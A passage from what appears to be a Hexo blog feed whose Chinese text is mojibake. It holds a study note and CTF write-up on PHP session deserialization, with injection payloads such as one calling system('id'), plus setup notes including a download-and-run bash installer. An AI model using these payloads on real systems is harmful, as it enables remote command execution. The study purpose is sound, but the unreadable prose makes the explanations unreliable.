class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ç¬¬äºŒä¸ªé¡µé¢æ˜¯æ²¡æœ‰æäº¤çš„åœ°æ–¹çš„ï¼Œä½†å¯ä»¥åœ¨ç¬¬ä¸€ä¸ªé¡µé¢ä¸­è¿›è¡ŒGETæäº¤å‚æ•°a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥åœ¨ç¬¬ä¸€ä¸ªé¡µé¢è¿›è¡Œå†™å…¥ï¼Œåœ¨ç¬¬äºŒä¸ªé¡µé¢è¿›è¡Œè¯»å–å¹¶æ‰§è¡Œå‘½ä»¤</p><p>æ³¨æ„åˆ°è¿™é‡Œæäº¤å†™è¿›å»æ˜¯ä»¥<code>php_serialize</code>çš„æ–¹å¼ï¼Œä½†æ˜¯è¯»å–çš„æ—¶å€™æ˜¯ä»¥<code>php</code>æ–¹å¼è¿›è¡Œè¯»å–çš„</p><p><strong><code>php</code>çš„è¯»å–æ–¹å¼æ˜¯ä»¥ç«–çº¿<code>|</code>ä¸ºåˆ†éš”ç¬¦ï¼Œç«–çº¿<code>|</code>å‰é¢çš„æ˜¯é”®åï¼Œç«–çº¿<code>|</code>åé¢çš„å°±æ˜¯è¦ååºåˆ—åŒ–çš„å†…å®¹</strong></p><p>åœ¨ç¬¬ä¸€ä¸ªé¡µé¢æäº¤GETå‚æ•°<code>a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=|O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä»¥<code>php_serialize</code>çš„æ–¹å¼å†™å…¥çš„ï¼Œæœ€ç»ˆå­˜å‚¨çš„æ ·å­ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># php_serializeï¼šç»è¿‡serialize()åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;|O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:13:&quot;</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>å½“åœ¨ç¬¬äºŒä¸ªç•Œé¢ä»¥<code>php</code>çš„æ–¹å¼å»è¯»å–çš„æ—¶å€™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># phpï¼šé”®å + ç«–çº¿ + ç»è¿‡serializeååºåˆ—åŒ–å¤„ç†çš„å€¼</span><br><br><span class="hljs-comment"># å½“ä½œé”®åçš„éƒ¨åˆ†ä¸º</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;</span><br><span class="hljs-string"># è¿›è¡Œååºåˆ—åŒ–çš„éƒ¨åˆ†ä¸º</span><br><span class="hljs-string">O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:13:&quot;</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºè¿›è¡Œååºåˆ—åŒ–çš„éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>åœ¨å‰é¢çš„éƒ¨åˆ†å·²ç»ä½¿ç”¨äº†<code>;&#125;</code>è¿›è¡Œäº†é—­åˆï¼Œæ»¡è¶³äº†åºåˆ—åŒ–æ•°æ®çš„æ ¼å¼ï¼Œæ‰€ä»¥åé¢å‰©ä½™çš„<code>â€œ;&#125;</code>å°±æ˜¯æ— ç”¨çš„</p><p>æ‰€ä»¥æœ€ç»ˆä¼šè¢«ååºåˆ—åŒ–çš„éƒ¨åˆ†æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192710093.png" alt="image-20250420192710093"></p><p>ç›´æ¥è®¿é—®ç¬¬äºŒä¸ªé¡µé¢å°±ä¼šå¾—åˆ°å‘½ä»¤æ‰§è¡Œçš„å›æ˜¾</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192815930.png" alt="image-20250420192815930"></p><p>ç»¼ä¸Šï¼Œ<code>session</code>ååºåˆ—åŒ–è¦æ»¡è¶³æœ‰ä¸€ä¸ªé¡µé¢å¯ä»¥å†™å…¥ï¼Œè¿˜æœ‰ä¸€ä¸ªé¡µé¢å¯ä»¥è¯»å–ï¼Œå¹¶ä¸”ä¸¤ä¸ªé¡µé¢çš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œå°±ä¼šå‡ºç°<code>session</code>ååºåˆ—åŒ–</p><h1 id="PHP-sessionååºåˆ—åŒ–ä¾‹é¢˜"><a href="#PHP-sessionååºåˆ—åŒ–ä¾‹é¢˜" class="headerlink" title="PHP sessionååºåˆ—åŒ–ä¾‹é¢˜"></a>PHP sessionååºåˆ—åŒ–ä¾‹é¢˜</h1><p>é¢˜ç›®çš„<code>index.php</code>çš„æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ª<code>hint.php</code>é¡µé¢ï¼Œè®¿é—®å¾—åˆ°æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><strong>å®¡è®¡ä»£ç </strong></p><ul><li>åœ¨<code>index.php</code>é¡µé¢ä¸­ï¼Œå¯åŠ¨äº†ä¸€ä¸ª PHP ä¼šè¯ï¼Œé»˜è®¤æ˜¯ä½¿ç”¨<code>php</code>çš„æ–¹å¼ï¼Œæœ‰ä¸€ä¸ª<code>Flag</code>çš„ç±»ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªå±æ€§åˆ†åˆ«æ˜¯<code>name</code>å’Œ<code>her</code>ï¼Œåœ¨å‘åºåˆ—åŒ–æ—¶ä¼šè§¦å‘<code>__wakeup</code>é­”æœ¯æ–¹æ³•ï¼Œå…ˆç»™<code>her</code>èµ‹å€¼ä¸ºä¸€ä¸ªéšæœºçš„1åˆ°10000çš„MD5å€¼ï¼Œå¹¶å’Œ<code>name</code>è¿›è¡Œæ¯”è¾ƒï¼Œæ¡ä»¶æ»¡è¶³å°±ä¼šåŒ…å«<code>flag.php</code>é¡µé¢ï¼Œå¹¶è¾“å‡ºflagï¼Œä½†æ˜¯åœ¨è¿™ä¸ªé¡µé¢ä¸­æ²¡æœ‰è¾“å…¥ç‚¹</li><li>åœ¨<code>hint.php</code>é¡µé¢ä¸­ï¼Œå£°æ˜äº†sessionçš„å­˜å‚¨æ–¹å¼ä¸º<code>php_serialize</code>ï¼Œå¹¶å¯ä»¥æäº¤GETå‚æ•°<code>a</code>ï¼Œæœ‰è¾“å…¥çš„åœ°æ–¹</li></ul><p>åœ¨è¿™é¢˜ä¸­ï¼Œæ»¡è¶³äº†å¯ä»¥åœ¨<code>hint.php</code>é¡µé¢ä¸­å†™å…¥ï¼Œå¯ä»¥åœ¨<code>index.php</code>é¡µé¢ä¸­è¯»å–ï¼Œå¹¶ä¸”ä¸¤ä¸ªé¡µé¢çš„å­˜å‚¨æ–¹å¼ä¸ä¸€æ ·ï¼Œè¯´æ˜å­˜åœ¨æœ‰sessionååºåˆ—åŒ–æ¼æ´</p><p>è¦æƒ³è¯»å–flagï¼Œå°±è¦æ»¡è¶³<code>name</code>å’Œ<code>her</code>çš„å€¼ç›¸ç­‰ï¼Œå¯ä»¥ä½¿ç”¨å–åœ°å€ç¬¦<code>&amp;</code>æ»¡è¶³è¿™ä¸ªæ¡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;name = &amp;<span class="hljs-variable">$a</span>-&gt;her;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200436497.png" alt="image-20250420200436497"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># åºåˆ—åŒ–åçš„ç»“æœ</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;her&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨<code>hint.php</code>é¡µé¢æäº¤GETå‚æ•°a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=|O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;her&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200809940.png" alt="image-20250420200809940"></p><p>ç„¶åç›´æ¥è®¿é—®<code>index.php</code>é¡µé¢å°±å¯ä»¥å¾—åˆ°flagäº†</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200826403.png" alt="image-20250420200826403"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>PHPååºåˆ—åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sessionååºåˆ—åŒ– å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨Ubuntuéƒ¨ç½²å®å¡”</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/</url>
    
    <content type="html"><![CDATA[<p>ç½‘å€ï¼š<a href="https://www.bt.cn/new/download.html">https://www.bt.cn/new/download.html</a></p><p>å®‰è£…å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [ -f /usr/bin/curl ];<span class="hljs-keyword">then</span> curl -sSO https://download.bt.cn/install/install_panel.sh;<span class="hljs-keyword">else</span> wget -O install_panel.sh https://download.bt.cn/install/install_panel.sh;<span class="hljs-keyword">fi</span>;bash install_panel.sh ed8484bec<br></code></pre></td></tr></table></figure><p>æœ€åä¼šå¾—åˆ°å®å¡”é¢æ¿ç™»å½•ä¿¡æ¯</p><p>å¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›è¡Œä¿®æ”¹é…ç½®</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/image-20250424114554547.png" alt="image-20250424114554547"></p><p>ç„¶åè¾“å…¥å‘½ä»¤ç¼–å·å³å¯ï¼Œä¹ æƒ¯ä¿®æ”¹ä»¥ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">5ä¿®æ”¹é¢æ¿å¯†ç <br>6ä¿®æ”¹é¢æ¿ç”¨æˆ·å<br>8ä¿®æ”¹é¢æ¿ç«¯å£<br>28ä¿®æ”¹é¢æ¿å®‰å…¨å…¥å£<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒæ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨kaliéƒ¨ç½²dockerå’Œdocker-compose</title>
    <link href="/2025/04/25/%E5%9C%A8kali%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose/"/>
    <url>/2025/04/25/%E5%9C%A8kali%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose/</url>
    
    <content type="html"><![CDATA[<p>æ›´æ–°ç³»ç»ŸåŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>å®‰è£…docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-cli<br></code></pre></td></tr></table></figure><p>éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼ˆæ‹‰å–hello-wordé•œåƒï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run hello-world<br></code></pre></td></tr></table></figure><p>å®‰è£…docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose<br></code></pre></td></tr></table></figure><p>å‡ºç°æŠ¥é”™ï¼Œæœ‰æ— æ³•ä¸‹è½½çš„å°±åŠ å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose --fix-missing<br></code></pre></td></tr></table></figure><p>æ›´æ¢dockeré•œåƒæºï¼ˆä¸€é”®æå¥½ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;registry-mirrors&quot;: [</span><br><span class="hljs-string">        &quot;https://hub.uuuadc.top&quot;,</span><br><span class="hljs-string">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.icu&quot;,</span><br><span class="hljs-string">        &quot;https://docker.ckyl.me&quot;,</span><br><span class="hljs-string">        &quot;https://docker.awsl9527.cn&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://docker.laoex.link&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://noohub.ru&quot;,</span><br><span class="hljs-string">        &quot;https://huecker.io&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.timeweb.cloud&quot;,</span><br><span class="hljs-string">        &quot;https://docker.rainbond.cc&quot;,</span><br><span class="hljs-string">        &quot;https://docker.1panel.live&quot;,</span><br><span class="hljs-string">        &quot;https://hub.rat.dev&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>dockerå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹å·²æœ‰é•œåƒ</span><br>docker images<br><br><span class="hljs-comment"># æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br>docker ps<br><br><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</span><br>docker ps -a<br><br><span class="hljs-comment"># æ„å»ºé•œåƒ</span><br>docker build -t é•œåƒåå­— .<br><br><span class="hljs-comment"># è¿è¡Œé•œåƒ</span><br>docker run -itd -p &lt;ä¸»æœºç«¯å£&gt;:&lt;å®¹å™¨ç«¯å£&gt; --name &lt;å®¹å™¨åå­—&gt; &lt;é•œåƒåå­—&gt;<br>å¦‚ï¼šdocker run -itd -p 2323:8080 --name crazy crazy:latest<br>docker run -it &lt;å®¹å™¨ID&gt; /bin/sh<br><br><span class="hljs-comment"># ä»¥ /bin/sh æƒé™è¿›å…¥å®¹å™¨äº¤äº’ç•Œé¢</span><br>docker <span class="hljs-built_in">exec</span> -it &lt;å®¹å™¨ID&gt; /bin/sh<br><br><span class="hljs-comment"># å¯åŠ¨å®¹å™¨</span><br>docker start &lt;å®¹å™¨åæˆ–ID&gt;<br><br><span class="hljs-comment"># æš‚åœå®¹å™¨</span><br>docker stop &lt;å®¹å™¨åæˆ–ID&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒæ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨Ubuntuéƒ¨ç½²MySQL</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2MySQL/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2MySQL/</url>
    
    <content type="html"><![CDATA[<p>æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>å®‰è£… MySQL æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install mysql-server<br></code></pre></td></tr></table></figure><p>å¯åŠ¨MySQLæœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl start mysql<br></code></pre></td></tr></table></figure><p>è®¾ç½®å¼€æœºè‡ªå¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> mysql<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥MySQLæœåŠ¡çŠ¶æ€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl status mysql<br></code></pre></td></tr></table></figure><p>è¿è¡Œå®‰å…¨è„šæœ¬ï¼Œå¯ä»¥è®¾ç½® root å¯†ç ã€ç§»é™¤åŒ¿åç”¨æˆ·ã€ç¦æ­¢ root è¿œç¨‹ç™»å½•ã€ç§»é™¤æµ‹è¯•æ•°æ®åº“ç­‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql_secure_installation<br></code></pre></td></tr></table></figure><p>ç™»å½•MySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -u root<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒæ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨Ubuntuéƒ¨ç½²dockerå’Œdocker-composeå’Œä½¿ç”¨å‘½ä»¤</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose%E5%92%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose%E5%92%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>æ›´æ–°ç³»ç»ŸåŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>å®‰è£…dockerï¼ˆç‰ˆæœ¬ä¸º 26.1.3<del>ubuntu1</del>24.04.1ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker.io<br></code></pre></td></tr></table></figure><p>éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼ˆæ‹‰å–hello-wordé•œåƒï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run hello-world<br></code></pre></td></tr></table></figure><p>å®‰è£…docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose<br></code></pre></td></tr></table></figure><p>æ›´æ¢dockeré•œåƒæºï¼ˆä¸€é”®æå¥½ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 